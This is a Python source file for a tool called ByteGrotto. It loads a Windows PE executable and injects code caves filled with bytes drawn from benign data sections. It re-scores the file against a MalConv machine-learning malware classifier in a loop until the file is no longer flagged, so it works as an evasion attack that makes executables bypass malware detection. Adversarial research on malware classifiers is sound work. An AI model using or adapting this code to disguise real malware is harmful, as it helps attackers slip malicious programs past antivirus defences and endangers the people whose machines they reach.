import os
import time
import copy
import glob
import torch
import shutil
import random
import pefile
import warnings
import collections
import numpy as np
import torch.nn.functional as F

from MalConv import MalConv

warnings.filterwarnings("ignore")


MALCONV_MODEL_PATH = 'models/malconv/malconv.checkpoint'
NONNEG_MODEL_PATH = 'models/nonneg/nonneg.checkpoint'

class MalConvModel(object):
    def __init__(self, model_path, thresh=0.5, name='malconv'): 
        self.model = MalConv(channels=256, window_size=512, embd_size=8).train()
        weights = torch.load(model_path,map_location='cpu')
        self.model.load_state_dict(weights['model_state_dict'])
        self.thresh = thresh
        self.__name__ = name

    def predict(self, bytez):
        _inp = torch.from_numpy( np.frombuffer(bytez,dtype=np.uint8)[np.newaxis,:] )
        with torch.no_grad():
            outputs = F.softmax( self.model(_inp), dim=-1)

        return outputs.detach().numpy()[0,1], outputs.detach().numpy()[0,1] > self.thresh

class ByteGrotto():
    def __init__(self, pe_path=None, pe_ouput_name=None, code_cave_size=512):
        self.pe_path = pe_path
        self.pe_ouput_name = pe_ouput_name
        self.code_cave_size = code_cave_size
        self.pe = pefile.PE(self.pe_path)
        self.section_info = collections.OrderedDict()
        self.prev_state_pe = None
        self.best_score = 1.0
        self.section_data_choices = []
    
    def set_section_data(self):
        for i in range(len(self.pe.sections)):
            self.section_info[self.pe.sections[i].Name.decode('utf-8')] = {
                "SizeOfRawData" : copy.deepcopy(self.pe.sections[i].SizeOfRawData),
                "PointerToRawData" : copy.deepcopy(self.pe.sections[i].PointerToRawData),
                "section_index" : i
            }

    def set_section_choices(self):
        section_data_choices = glob.glob("data_sections/*")
        for i in range(len(section_data_choices)):
            file_size = os.path.getsize(section_data_choices[i])
            if file_size > self.pe.OPTIONAL_HEADER.SectionAlignment:
                self.section_data_choices.append(section_data_choices[i])

    def write(self):
        try:
            self.pe.OPTIONAL_HEADER.CheckSum = self.pe.generate_checksum()
        except Exception as e:
            print("Error: unable to compute checksum - {}".format(e))

        self.pe.write(self.pe_ouput_name)
        self.pe.close()

        if os.path.exists("temp/"):
            shutil.rmtree('temp/')

    def manage_pe_state(self, score):
        if score > self.best_score:
            self.pe = self.prev_state_pe
        else:
            self.best_score = score

    def generate_adversarial_pe(self):
        epoch = 1

        self.set_section_data()
        self.set_section_choices()
 
        score, flagged = self.evaluate()

        while flagged:
            self.add_code_cave()
            self.write()
            score, flagged = self.evaluate()
            self.manage_pe_state(score)

            print("\rEpoch: {} Score: {} Best: {}".format(epoch, score, self.best_score), end='')
            if len(self.pe.__data__) > 2000000:
                print("Unable to find bypass")
                return

            epoch += 1

    
    def get_data(self, raw_data_size_delta):
        data_file = self.section_data_choices[random.randrange(len(self.section_data_choices))]

        try:
            with open(data_file, "rb") as f:
                data = f.read() 
        except IOError:
            print('Error: cannot open the file - {}'.format(data_file))

        # choose a random offset for the data sample
        offset = random.randrange(0, len(data) - raw_data_size_delta)

        return bytearray(data[offset:offset+raw_data_size_delta])

    def evaluate(self):
        self.pe.write(self.pe_ouput_name)
        file_data = open(self.pe_ouput_name, "rb").read()
        malconv = MalConvModel(MALCONV_MODEL_PATH, thresh=0.5)
        return malconv.predict(file_data)

    def align_new_section_size(self, current_section_size, section_alignment):
        return ((current_section_size + section_alignment) // section_alignment) * section_alignment if current_section_size % section_alignment else current_section_size

    def add_code_cave(self):
            self.prev_state_pe = copy.copy(self.pe)
            last_section_end_offset = 0
            offsets = {}

            for section_name, section_info in self.section_info.items():
                new_section_size =  section_info['SizeOfRawData'] + self.code_cave_size
                new_size_of_raw_data = self.align_new_section_size(new_section_size, self.pe.OPTIONAL_HEADER.SectionAlignment)
                raw_data_size_delta = new_size_of_raw_data - section_info['SizeOfRawData']
                new_code_data = self.get_data(raw_data_size_delta)

                if section_info['section_index'] == 0:
                    offsets[self.pe.sections[section_info['section_index']].PointerToRawData + section_info['SizeOfRawData']] = new_code_data
                else:
                    offsets[last_section_end_offset + section_info['SizeOfRawData']] = new_code_data
                    self.pe.sections[section_info['section_index']].PointerToRawData = last_section_end_offset
                
                last_section_end_offset = self.pe.sections[section_info['section_index']].PointerToRawData + new_size_of_raw_data
                self.section_info[section_name]['SizeOfRawData'] = new_size_of_raw_data
            
            if not os.path.exists("temp/"):
                os.mkdir("temp/")

            s = str(time.time())
            self.pe.write("temp/{}".format(s))
            self.pe.close()
            with open("temp/{}".format(s), 'rb+') as f:
                ba = bytearray(f.read())
                f.close()

            for k,v in offsets.items():
                ba[k:k] = v
            
            with open("temp/{}".format(s), 'wb+') as f:
                f.write(ba)
                f.close()

            self.pe = pefile.PE("temp/{}".format(s))